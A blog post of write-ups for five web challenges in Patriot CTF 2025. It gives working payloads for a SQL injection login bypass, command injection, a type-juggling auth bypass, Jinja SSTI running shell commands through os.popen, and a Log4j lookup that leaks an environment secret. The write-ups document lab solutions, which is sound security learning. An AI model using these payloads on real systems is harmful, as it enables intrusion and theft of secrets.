+++
date = '2025-11-24T10:34:41+07:00'
title = 'Patriot CTF 2025 - Web Challenges Writeups'
tags = ['Patriot CTF 2025', 'CTFs']
description = 'My web challenges writeups in Patriot CTF 2025.'
draft = false

[cover]
  image = '/images/posts/patriot-ctf-2025-cover2.jpg'
  alt = 'Patriot CTF 2025 - Web Challenges Writeups'
  caption = 'Patriot CTF 2025 - Web Challenges Writeups'
  relative = false
+++

I'm a player in web, so all my writeups about web challenges in Patriot CTF 2025, since the challs are closed after the event so there aren't any images of challs. These are all 5 web challs in the event:

## Connection Tester

**Goal**

Leveraging SQLi and Command Injection to get the flag.

**My Solution**

The app has a login form and there isn't any credentials given, so tried some simple SQL Injection to bypass the login, normally `admin` account existed so inject:

```
Username: admin' --
Password: anything
```

We successfully logged in as `admin`, then there is a connection input, it will ping, so we can use Command Injection to make the server doing other things than `ping`. Payload:

```bash
; cat flag.txt #
```

By this, we can get the flag

---

## 🔐 SecureAuth™

**Goal**

This app is vulnerable to wrong logic coding and SQL Injection, tried and get the flag

**My Solution**

Logged as `guest` with password `guest123`, it takes us to the home page and there is a message: `⚠️ Admin privileges required for flag access`. So we have to log in as admin. Initially, I tried to decode the cookie value and encode a new one with admin privileges however I don't know the secret key so it is impossible.

Then I logged out and tried some SQL Injection and found an unusual way to logged in as admin:

```json
{
    "username": "admin",
    "password": "",
    "remember": true
}
```

This returns the flag. The app is vulnerable with Python Type Juggling

---

## Trust Fall

**Goal**

Examining and emunerating the web app to find the correct API endpoint and get the flag.

**My Solution**

Logged in as `testuser` and `pass123` to log in to the app, the app has a check for admin however we're not admin yet, examining the source found `app.js`:

```javascript
const AUTH_TOKEN = 'trustfall-readonly';

const productTable = document.getElementById('product-table');

const detailCard = document.getElementById('detail-card');

const adminLink = document.getElementById('admin-link');

const adminStatus = document.getElementById('admin-status');

async function fetchJson(url, options = {}) {
    const response = await fetch(url, {
        credentials: 'same-origin',

        ...options,

        headers: {
            ...(options.headers || {}),

            Authorization: `Bearer ${AUTH_TOKEN}`,
        },
    });

    if (!response.ok) {
        throw new Error(`Request failed with status ${response.status}`);
    }

    return response.json();
}

function renderProducts(products) {
    productTable.innerHTML = '';

    products.forEach(product => {
        const row = document.createElement('tr');

        const skuCell = document.createElement('td');

        const skuLink = document.createElement('a');

        skuLink.href = `#${product.sku}`;

        skuLink.textContent = product.sku;

        skuLink.addEventListener('click', event => {
            event.preventDefault();

            loadProductDetails(product.sku);
        });

        skuCell.appendChild(skuLink);

        const nameCell = document.createElement('td');

        nameCell.textContent = product.name;

        const priceCell = document.createElement('td');

        priceCell.textContent = product.price ? `$${product.price.toFixed(2)}` : '—';

        const updatedByCell = document.createElement('td');

        updatedByCell.textContent =
            typeof product.updatedBy === 'number' ? product.updatedBy : 'unknown';

        row.appendChild(skuCell);

        row.appendChild(nameCell);

        row.appendChild(priceCell);

        row.appendChild(updatedByCell);

        productTable.appendChild(row);
    });
}

function renderProductDetails(product) {
    detailCard.innerHTML = '';

    const title = document.createElement('h3');

    title.textContent = product.name;

    const skuMeta = document.createElement('p');

    skuMeta.className = 'meta';

    skuMeta.textContent = `SKU: ${product.sku}`;

    const updatedMeta = document.createElement('p');

    updatedMeta.className = 'meta';

    const updatedByLabel = typeof product.updatedBy === 'number' ? product.updatedBy : 'unknown';

    updatedMeta.textContent = `Updated By: User ${updatedByLabel}`;

    const description = document.createElement('p');

    description.textContent = product.description || 'No description available.';

    detailCard.appendChild(title);

    detailCard.appendChild(skuMeta);

    detailCard.appendChild(updatedMeta);

    detailCard.appendChild(description);
}

function renderError(message) {
    detailCard.innerHTML = '';

    const error = document.createElement('p');

    error.className = 'placeholder';

    error.textContent = message;

    detailCard.appendChild(error);
}

async function loadProductDetails(sku) {
    try {
        const product = await fetchJson(`/api/products/${encodeURIComponent(sku)}`);

        renderProductDetails(product);
    } catch (error) {
        renderError('Unable to load product details.');

        // eslint-disable-next-line no-console

        console.error(error);
    }
}

async function bootstrap() {
    try {
        const products = await fetchJson('/api/products');

        renderProducts(products);
    } catch (error) {
        productTable.innerHTML = '';

        const row = document.createElement('tr');

        const cell = document.createElement('td');

        cell.colSpan = 4;

        cell.className = 'placeholder';

        cell.textContent = 'Catalog unavailable.';

        row.appendChild(cell);

        productTable.appendChild(row);

        // eslint-disable-next-line no-console

        console.error(error);
    }
}

function wireAdminLink() {
    if (!adminLink || !adminStatus) {
        return;
    }

    adminLink.addEventListener('click', async event => {
        event.preventDefault();

        adminStatus.className = 'admin-status';

        adminStatus.textContent = 'Checking admin privileges...';

        try {
            const response = await fetch('/admin', {
                credentials: 'same-origin',

                headers: { Authorization: `Bearer ${AUTH_TOKEN}` },
            });

            if (response.status === 403) {
                adminStatus.textContent = 'Unauthorized: admin console restricted to leadership.';
            } else if (response.ok) {
                adminStatus.className = 'admin-status success';

                adminStatus.textContent = 'Admin console accessible.';
            } else {
                adminStatus.textContent = `Unexpected response: ${response.status}`;
            }
        } catch (error) {
            adminStatus.textContent = 'Unable to reach admin console.';

            // eslint-disable-next-line no-console

            console.error(error);
        }
    });
}

document.addEventListener('DOMContentLoaded', () => {
    bootstrap();

    wireAdminLink();
});
```

This Javascript code is the logic for the website working, however after testing and examining the endpoints related to this file, I didn't find anything although I have tried SQL Injection and more. Then I tried blind testing other popular endpoints and find this API endpoint `/api/users/:id`. Use `curl`:

```bash
curl http://SERVER/api/users/0
```

Got the response:

```json
{
    "id": 0,
    "username": "root",
    "role": "superuser",
    "flag": "PCTF{authz_misconfig_owns_u}"
}
```

---

## Trust Vault

**Goal**

This website is vulnerable to SSTI, leveraging this to get the flag.

**My Solution**

Create an account and logged in we can find 3 paths: `/bookmarks`, `/audit`, `/reports`. Inspecting the source of these 3 pages we can find a hidden page `/search`. In this page, there is a search input, tried a simple SSTI payloads:

```
{{7*7}}
```

Got `49`, therefore we know SSTI can be used in this challenge:

```
' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}" --
```

Found a file `flag-e1aadb58a27f03a274f54d2883bce54b.txt`, run payload:

```
' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag-e1aadb58a27f03a274f54d2883bce54b.txt').read() }}" --
```

By this we can get the flag.

---

## Feedback Fallout

**Goal**

This challenge is built based on CVE-2021-44228, leveraging this and get the flag.

**My Solution**

This web challenge takes me so much time to tried to get RCE but then I figured out that to solve this challenge is just guess the secret variable from the server :((.

The web app just have a feedback form which will make a POST request to `/feedback`. Based on the description and the hint on the page, we can guess that this web app is vulnerable because using Log4j which is well known with the vulnerability CVE-2021-44228. We can tried using `${user.name}` we can get `root` in the response.

The flag is stored in the secret `SECRET_FLAG`, submit `${env:SECRET_FLAG}`, examining the response of the POST request to `/feedback` and we can get the flag.

```json
{
    "status": "success",
    "logs": "[2025-02-01 12:34:56] [SESSION:ABC123] User feedback: FLAG{…}"
}
```
